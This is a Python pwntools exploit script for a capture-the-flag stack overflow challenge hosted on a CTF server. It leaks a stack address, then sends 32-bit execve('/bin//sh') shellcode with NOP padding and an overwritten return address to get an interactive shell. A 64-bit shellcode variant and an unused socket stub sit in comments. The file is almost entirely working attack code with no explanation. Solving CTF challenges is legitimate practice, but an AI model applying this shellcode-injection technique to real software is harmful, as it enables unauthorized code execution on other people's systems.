from pwn import *

r = remote("ctf.j0n9hyun.xyz", 3006)
e = ELF("/Users/yee/Code/Python/Simple_overflow_ver_2")

r.recvuntil("Data : ")
r.sendline("AAAA")
address = int(r.recv()[:10], 16)
r.recvuntil("Again (y/n): ")
r.sendline("y")

# 31byte 64bit
# shell = b'\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05'
# 23byte 32bit
shell = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'

payload = b''
payload += shell
# var char *s ebp-0x88
payload += b'\x90' * (0x88 - 23 + 4)
payload += p32(address)

r.recvuntil("Data : ")
r.sendline(payload)
r.recvuntil("Again (y/n): ")
r.send('n')

r.interactive()

# import socket
# import time
 
# ADDR = 'ctf.j0n9hyun.xyz' , 3006
 
# s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# s.connect(ADDR) # IP, Port
 
# msg = s.recv(1024)
 
# print(msg)
 
# s.send("TEST")
 
# print s.recv(1024)